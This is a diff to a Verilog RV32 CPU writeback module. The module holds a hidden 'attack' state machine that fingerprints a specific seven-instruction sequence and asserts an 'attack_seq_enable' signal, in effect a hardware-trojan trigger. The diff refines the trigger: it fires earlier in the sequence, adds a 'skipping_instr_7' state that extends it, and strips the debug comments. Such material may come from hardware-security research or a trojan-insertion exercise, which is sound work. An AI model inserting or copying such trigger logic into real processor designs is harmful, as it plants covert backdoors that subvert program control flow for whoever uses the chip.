@@ -69,7 +69,8 @@ module rv32_writeback (
         waiting_instr_3  = 3'b011,
         waiting_instr_4  = 3'b100,
         waiting_instr_5  = 3'b101,
-        waiting_instr_6  = 3'b110;
+        waiting_instr_6  = 3'b110,
+        skipping_instr_7  = 3'b111;
     reg [2:0] attack_state;
 
 /*
@@ -100,13 +101,13 @@ $ grep -A1 -n -e fef400a3 -e fe244703 -e 00800793 -e 02f71a63 -e fe144703 -e 001
 
 */
     localparam
-         instr_0 = 32'hfef400a3, //          	sb	a5,-31(s0)
-         instr_1 = 32'hfe244703, //          	lbu	a4,-30(s0)
-         instr_2 = 32'h00800793, //          	li	a5,8
-         instr_3 = 32'h02f71a63, //          	bne	a4,a5,30c <main+0x218>
-         instr_4 = 32'hfe144703, //          	lbu	a4,-31(s0)
-         instr_5 = 32'h00100793, //          	li	a5,1
-         instr_6 = 32'h02f71063; //         	bne	a4,a5,304 <main+0x210>
+         instr_0 = 32'hfef400a3,                                  // sb  a5,-31(s0)
+         instr_1 = 32'hfe244703,                                  // lbu a4,-30(s0)
+         instr_2 = 32'h00800793,                                  // li  a5,8
+         instr_3 = 32'h02f71a63,                                  // bne a4,a5,30c <main+0x218>
+         instr_4 = 32'hfe144703,                                  // lbu a4,-31(s0)
+         instr_5 = 32'h00100793,                                  // li  a5,1
+         instr_6 = 32'h02f71063;                                  // bne a4,a5,304 <main+0x210>
 
     always_ff @(posedge clk) begin
         if (reset) begin
@@ -115,36 +116,36 @@ $ grep -A1 -n -e fef400a3 -e fe244703 -e 00800793 -e 02f71a63 -e fe144703 -e 001
         end else if ( !flush_in && valid_in ) begin 
             case (attack_state)
                 waiting_instr_0: begin
-                    if (instr_in == instr_0) begin
+                    if (instr_in == instr_0) begin                // sb	a5,-31(s0)
                          attack_state      <= waiting_instr_1;
-                         attack_seq_enable <= 0;                  // DETECTED
+                         attack_seq_enable <= 0;
                     end else begin 
                          attack_state      <= waiting_instr_0;
                          attack_seq_enable <= 0;
                     end
                 end
                 waiting_instr_1: begin
-                    if (instr_in == instr_1) begin
+                    if (instr_in == instr_1) begin                // lbu a4,-30(s0)
                          attack_state      <= waiting_instr_2;
-                         attack_seq_enable <= 0;                  // DETECTED
+                         attack_seq_enable <= 0;
                     end else begin
                          attack_state      <= waiting_instr_0;
                          attack_seq_enable <= 0;
                     end
                 end
                 waiting_instr_2: begin
-                    if (instr_in == instr_2) begin
+                    if (instr_in == instr_2) begin                // li  a5,8
                          attack_state      <= waiting_instr_3;
-                         attack_seq_enable <= 0;                  // DETECTED
+                         attack_seq_enable <= 0;
                     end else begin
                          attack_state      <= waiting_instr_0;
                          attack_seq_enable <= 0;
                     end
                 end
                 waiting_instr_3: begin
-                    if (instr_in == instr_3) begin
+                    if (instr_in == instr_3) begin                // bne a4,a5,30c <main+0x218>
                          attack_state      <= waiting_instr_4;
-                         attack_seq_enable <= 0;                  // DETECTED
+                         attack_seq_enable <= 0;
                     end else begin
                          attack_state      <= waiting_instr_0;
                          attack_seq_enable <= 0;
@@ -152,9 +153,9 @@ $ grep -A1 -n -e fef400a3 -e fe244703 -e 00800793 -e 02f71a63 -e fe144703 -e 001
 
                 end
                 waiting_instr_4: begin
-                    if (instr_in == instr_4) begin
+                    if (instr_in == instr_4) begin                // lbu a4,-31(s0)
                          attack_state      <= waiting_instr_5;
-                         attack_seq_enable <= 0;                  // DETECTED
+                         attack_seq_enable <= 1;
                     end else begin
                          attack_state      <= waiting_instr_0;
                          attack_seq_enable <= 0;
@@ -162,9 +163,9 @@ $ grep -A1 -n -e fef400a3 -e fe244703 -e 00800793 -e 02f71a63 -e fe144703 -e 001
                 end
 
                 waiting_instr_5: begin
-                    if (instr_in == instr_5) begin
+                    if (instr_in == instr_5) begin                // li  a5,1
                          attack_state      <= waiting_instr_6;
-                         attack_seq_enable <= 0;                  // DETECTED
+                         attack_seq_enable <= 1;
                     end else begin
                          attack_state      <= waiting_instr_0;
                          attack_seq_enable <= 0;
@@ -172,28 +173,19 @@ $ grep -A1 -n -e fef400a3 -e fe244703 -e 00800793 -e 02f71a63 -e fe144703 -e 001
                 end
 
                 waiting_instr_6: begin
-                    if (instr_in == instr_6) begin
-                         attack_state      <= waiting_instr_0;
-                         attack_seq_enable <= 1;                  // DETECTED ???
+                    if (instr_in == instr_6) begin                // bne a4,a5,304 <main+0x210>
+                         attack_state      <= skipping_instr_7;
+                         attack_seq_enable <= 1;
                     end else begin
                          attack_state      <= waiting_instr_0;
                          attack_seq_enable <= 0;
                     end
                 end
-/*
 
-                skipping_instr_5: begin
-                    attack_state      <= skipping_instr_6;
-                    attack_seq_enable <= 0;
-                end
-                skipping_instr_6: begin
-                    attack_state      <= skipping_instr_7;
-                    attack_seq_enable <= 0;
-                end
                 skipping_instr_7: begin
                     attack_state      <= waiting_instr_0;
-                    attack_seq_enable <= 0;
-                end*/
+                    attack_seq_enable <= 1;
+                end
                 default: begin
                     attack_state      <= waiting_instr_0;
                     attack_seq_enable <= 0;
